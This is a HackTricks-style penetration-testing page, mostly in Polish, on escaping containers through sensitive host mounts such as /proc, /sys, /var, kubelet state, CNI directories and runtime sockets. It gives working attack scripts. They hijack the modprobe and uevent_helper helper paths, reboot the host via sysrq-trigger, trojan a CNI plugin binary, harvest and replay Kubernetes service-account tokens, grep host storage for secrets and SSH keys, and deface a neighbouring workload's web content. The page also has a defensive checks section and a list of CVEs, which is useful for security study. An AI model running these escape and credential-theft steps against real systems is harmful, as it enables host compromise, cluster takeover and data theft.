# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Host mounts to jeden z najważniejszych praktycznych surface do container-escape, ponieważ często sprowadzają starannie odizolowany widok procesu z powrotem do bezpośredniej widoczności zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounts `/proc`, `/sys`, `/var`, runtime sockets, stan zarządzany przez kubelet lub ścieżki związane z device mogą ujawniać kontrolę jądra, credentials, sąsiednie filesystemy kontenerów oraz interfejsy zarządzania runtime.

Ta strona istnieje osobno od pojedynczych stron ochrony, ponieważ model nadużyć jest przekrojowy. Writable host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu pokrycia przez AppArmor lub SELinux, a częściowo z powodu tego, jaki dokładnie host path został ujawniony. Traktowanie tego jako osobnego tematu znacznie ułatwia rozumowanie o surface ataku.

## Ekspozycja `/proc`

procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy kontroli jądra o dużym wpływie. Bind mount taki jak `-v /proc:/host/proc` lub widok kontenera, który ujawnia nieoczekiwane zapisywalne wpisy proc, może więc prowadzić do disclosure informacji, denial of service lub bezpośredniego wykonania kodu na hoście.

Wysokowartościowe ścieżki procfs obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Zacznij od sprawdzenia, które wpisy procfs o wysokiej wartości są widoczne lub zapisywalne:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się host code-execution paths, gdy są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` to potężne źródła reconnaissance do kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst procesu, cgroup i filesystem, co może pomóc odtworzyć układ hosta z wnętrza kontenera.

Praktyczna wartość każdej ścieżki jest inna, a traktowanie ich wszystkich tak, jakby miały ten sam wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
Jeśli jest zapisywalny, to jest to jedna z najbardziej wpływowych ścieżek procfs, ponieważ kernel wykona pipe handler po craszu. Kontener, który może wskazać `core_pattern` na payload zapisany w swoim overlay albo w zamontowanej ścieżce hosta, często może uzyskać host code execution. Zobacz też [read-only-paths.md](protections/read-only-paths.md) dla dedykowanego przykładu.
- `/proc/sys/kernel/modprobe`
Ta ścieżka kontroluje userspace helper używany przez kernel, gdy musi wywołać logicę ładowania modułu. Jeśli można ją zapisać z kontenera i jest interpretowana w kontekście hosta, może stać się kolejnym host code-execution primitive. Jest to szczególnie interesujące w połączeniu ze sposobem na wyzwolenie ścieżki helpera.
- `/proc/sys/vm/panic_on_oom`
Zwykle nie jest to czysty escape primitive, ale może zamienić presję pamięci w denial of service obejmujący cały host, przekształcając warunki OOM w zachowanie kernel panic.
- `/proc/sys/fs/binfmt_misc`
Jeśli interfejs rejestracji jest zapisywalny, atakujący może zarejestrować handler dla wybranej wartości magic i uzyskać wykonanie w kontekście hosta, gdy zostanie uruchomiony pasujący plik.
- `/proc/config.gz`
Przydatne do kernel exploit triage. Pomaga ustalić, które subsystems, mitigations i opcjonalne funkcje kernel są włączone, bez potrzeby host package metadata.
- `/proc/sysrq-trigger`
Głównie ścieżka do denial of service, ale bardzo poważna. Może natychmiast zrestartować host, wywołać panic lub w inny sposób go zakłócić.
- `/proc/kmsg`
Ujawnia komunikaty kernel ring buffer. Przydatne do host fingerprinting, crash analysis oraz w niektórych środowiskach do leak informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
Cenne, gdy jest czytelne, ponieważ ujawnia informacje o eksportowanych symbolach kernel i może pomóc obejść założenia dotyczące address randomization podczas tworzenia kernel exploit.
- `/proc/[pid]/mem`
To bezpośredni interfejs do pamięci procesu. Jeśli docelowy proces jest osiągalny przy spełnieniu wymaganych warunków w stylu ptrace, może pozwolić na odczyt lub modyfikację pamięci innego procesu. Realistyczny wpływ zależy mocno od credentials, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
Ujawnia widok pamięci systemu w stylu core-image. Plik jest ogromny i niewygodny w użyciu, ale jeśli jest sensownie czytelny, oznacza to źle wystawioną powierzchnię pamięci hosta.
- `/proc/kmem` and `/proc/mem`
Historycznie wysokiego wpływu surowe interfejsy pamięci. W wielu nowoczesnych systemach są wyłączone albo mocno ograniczone, ale jeśli są obecne i użyteczne, należy traktować je jako krytyczne findings.
- `/proc/sched_debug`
Wycieka informacje o planowaniu i task, które mogą ujawnić tożsamości procesów hosta, nawet gdy inne widoki procesów wyglądają czyściej niż oczekiwano.
- `/proc/[pid]/mountinfo`
Bardzo przydatne do odtworzenia, gdzie naprawdę znajduje się kontener na hoście, które ścieżki są oparte o overlay i czy writable mount odpowiada host content, czy tylko warstwie kontenera.

Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlay są czytelne, użyj ich, aby odzyskać host path filesystem kontenera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Te polecenia są przydatne, ponieważ wiele trików host-execution wymaga przekształcenia ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z perspektywy hosta.

### Full Example: `modprobe` Helper Path Abuse

Jeśli `/proc/sys/kernel/modprobe` jest zapisywalny z kontenera, a ścieżka helpera jest interpretowana w kontekście hosta, można ją przekierować na payload kontrolowany przez atakującego:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Dokładny trigger zależy od celu i zachowania kernela, ale ważny punkt jest taki, że zapisywalna ścieżka helpera może przekierować przyszłe wywołanie kernel helper do kontrolowanej przez atakującego zawartości host-path.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Jeśli celem jest ocena exploitability, a nie natychmiastowy escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Te polecenia pomagają odpowiedzieć, czy widoczne są użyteczne informacje o symbolach, czy ostatnie komunikaty jądra ujawniają interesujący stan oraz które funkcje lub mitigations jądra są skompilowane. Wpływ zwykle nie polega na bezpośrednim escape, ale może znacznie skrócić triage podatności jądra.

### Full Example: SysRq Host Reboot

Jeśli `/proc/sysrq-trigger` jest zapisywalny i osiąga widok hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efekt jest natychmiastowy reboot hosta. To nie jest subtelny przykład, ale jasno pokazuje, że ekspozycja procfs może być znacznie poważniejsza niż disclosure informacji.

## `/sys` Exposure

sysfs exposeuje duże ilości stanu kernel i device. Niektóre ścieżki sysfs są głównie przydatne do fingerprinting, podczas gdy inne mogą wpływać na wykonanie helper, zachowanie device, konfigurację security-module lub stan firmware.

High-value ścieżki sysfs obejmują:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na behavior thermal-management, a więc na stabilność hosta w źle wystawionych środowiskach. `/sys/kernel/vmcoreinfo` może leakować informacje o crash-dump i układzie kernel, co pomaga w niskopoziomowym fingerprinting hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany access może exposeować lub zmieniać stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na firmware-backed ustawienia boot, co czyni je znacznie poważniejszymi niż zwykłe pliki konfiguracyjne. `debugfs` pod `/sys/kernel/debug` jest szczególnie dangerous, ponieważ jest celowo interfejsem dla developerów z dużo mniejszymi oczekiwaniami bezpieczeństwa niż hardened production-facing kernel APIs.

Przydatne komendy review dla tych ścieżek to:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Co sprawia, że te polecenia są interesujące:

- `/sys/kernel/security` może ujawniać, czy AppArmor, SELinux albo inny LSM jest widoczny w sposób, który powinien pozostać tylko hostowy.
- `/sys/kernel/debug` to często najbardziej alarmujące znalezisko w tej grupie. Jeśli `debugfs` jest zamontowany i możliwy do odczytu lub zapisu, spodziewaj się szerokiej powierzchni interakcji z jądrem, której dokładne ryzyko zależy od włączonych węzłów debug.
- Ujawnienie zmiennych EFI jest rzadsze, ale jeśli występuje, ma duży wpływ, ponieważ dotyczy ustawień wspieranych przez firmware, a nie zwykłych plików runtime.
- `/sys/class/thermal` jest głównie istotne dla stabilności hosta i interakcji ze sprzętem, a nie dla zgrabnego escape w stylu shell.
- `/sys/kernel/vmcoreinfo` jest głównie źródłem host fingerprinting i analizy crashy, przydatnym do zrozumienia niskopoziomowego stanu jądra.

### Full Example: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest możliwy do zapisu, jądro może uruchomić helper kontrolowany przez atakującego, gdy zostanie wyzwolony `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Powód, dla którego to działa, jest taki, że ścieżka helper jest interpretowana z perspektywy hosta. Po uruchomieniu helper działa w kontekście hosta, a nie wewnątrz bieżącego container.

## `/var` Exposure

Zamontowanie `/var` hosta do container jest często niedoceniane, ponieważ nie wygląda tak dramatycznie jak montowanie `/`. W praktyce może to wystarczyć, aby uzyskać dostęp do runtime sockets, katalogów snapshotów container, wolumenów podów zarządzanych przez kubelet, projected service-account tokens oraz sąsiednich filesystemów aplikacji. Na nowoczesnych node'ach `/var` często jest miejscem, gdzie faktycznie znajduje się najbardziej interesujący operacyjnie stan container.

### Kubernetes Example

Pod z `hostPath: /var` często może odczytać projected tokens innych podów oraz zawartość overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Te komendy są przydatne, ponieważ odpowiadają na pytanie, czy mount ujawnia tylko mało istotne dane aplikacji, czy też wysokowartościowe poświadczenia klastra. Czytelny token service-account może natychmiast zamienić local code execution w dostęp do Kubernetes API.

Jeśli token jest obecny, sprawdź, do czego daje dostęp, zamiast kończyć na samym wykryciu tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Wpływ tutaj może być znacznie większy niż lokalny dostęp do node. Token z szerokim RBAC może zamienić zamontowany `/var` w compromise całego cluster.

### Docker And containerd Example

Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na node Kubernetes opartych na containerd mogą być w `/var/lib/containerd` lub w ścieżkach specyficznych dla snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Jeśli zamontowany `/var` ujawnia zapisywalną zawartość snapshotu innego workloadu, atakujący może być w stanie zmodyfikować pliki aplikacji, umieścić web content lub zmienić skrypty startowe bez dotykania bieżącej konfiguracji kontenera.

Konkretne pomysły nadużyć po znalezieniu zapisywalnej zawartości snapshotu:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Te komendy są przydatne, ponieważ pokazują trzy główne rodziny wpływu mountów `/var`: modyfikacja aplikacji, odzyskiwanie secretów oraz lateral movement do sąsiednich workloads.

## Kubelet State, Plugins, And CNI Paths

Mount `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często udostępniany przez uprzywilejowane DaemonSets, agenty CNI, node plugins CSI, GPU operators i storage helpers. Te mounty łatwo zbyć jako „node plumbing”, ale znajdują się bezpośrednio w ścieżce wykonania nowych podów i często zawierają kubelet credentials, projected secrets, registration sockets oraz wykonywalne host-side plugin binaries.

Targety o wysokiej wartości obejmują:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Przydatne komendy do review to:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Why these paths matter:

- `/var/lib/kubelet/pki` może ujawniać kubelet client certificates oraz inne node-local credentials, które czasem da się ponownie wykorzystać przeciwko API server lub kubelet-facing TLS endpoints, zależnie od projektu klastra.
- `/var/lib/kubelet/pods` często zawiera projected service-account tokens oraz mounted Secrets dla sąsiednich pods na tym samym node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` to głównie reconnaissance surface, ale bardzo użyteczne: ujawnia, które pods i containers aktualnie korzystają z GPUs, hugepages, SR-IOV devices oraz innych rzadkich node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` ujawniają, które CSI, DRA i device plugins są zainstalowane oraz z którymi sockets kubelet ma się łączyć. Jeśli te katalogi są writable zamiast tylko readable, finding staje się znacznie poważniejszy.
- `/opt/cni/bin` oraz `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce pod-network setup. Writable access do nich często jest opóźnionym host-execution primitive, a nie tylko ujawnieniem konfiguracji.

### Full Example: Writable `/opt/cni/bin`

If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
To nie jest tak natychmiastowe jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w skompromitowanych podach infrastruktury Kubernetes. Ważny punkt jest taki, że zmodyfikowany binarny plik jest później wykonywany przez host network setup flow, a nie przez bieżący container.


## Runtime Sockets

Sensitive host mounts często obejmują runtime sockets zamiast pełnych katalogów. Są one na tyle ważne, że zasługują na wyraźne powtórzenie tutaj:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dla pełnych przepływów exploatacji, gdy jeden z tych socketów jest zamontowany.

Jako szybki pierwszy wzorzec interakcji:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Jeśli jedno z nich się powiedzie, ścieżka od "mounted socket" do "start a more privileged sibling container" jest zwykle znacznie krótsza niż jakakolwiek ścieżka kernel breakout.

## Mount-Related CVEs

Host mounts również przecinają się z vulnerability runtime. Ważne ostatnie przykłady obejmują:

- `CVE-2024-21626` w `runc`, gdzie wyciekły deskryptor pliku katalogu mógł umieścić working directory na host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfiles, frontends i przepływy `RUN --mount` mogły ponownie wprowadzić host file access, deletion, albo elevated privileges podczas builds.
- `CVE-2024-1753` w Buildah i Podman build flows, gdzie spreparowane bind mounts podczas build mogły ujawnić `/` read-write.
- `CVE-2025-47290` w `containerd` 2.1.0, gdzie TOCTOU podczas image unpack mogło pozwolić specjalnie spreparowanemu image modyfikować host filesystem podczas pull.

Te CVEs są tutaj ważne, ponieważ pokazują, że obsługa mount nie dotyczy tylko konfiguracji operatora. Sam runtime może również wprowadzać warunki escape oparte na mount.

## Checks

Użyj tych komend, aby szybko zlokalizować mount exposures o najwyższej wartości:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Co jest tutaj interesujące:

- Host root, `/proc`, `/sys`, `/var` oraz runtime sockets to wszystkie znaleziska o wysokim priorytecie.
- Zapisywalne wpisy proc/sys często oznaczają, że mount udostępnia host-global kernel controls, a nie bezpieczny widok kontenera.
- Zamontowane ścieżki `/var` wymagają przeglądu credentiali i sąsiednich workloadów, a nie tylko przeglądu filesystem.
- Katalogi stanu kubelet i ścieżki CNI/plugin zasługują na taki sam priorytet jak runtime sockets, ponieważ często znajdują się bezpośrednio na ścieżce tworzenia podów i dystrybucji credentiali na node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
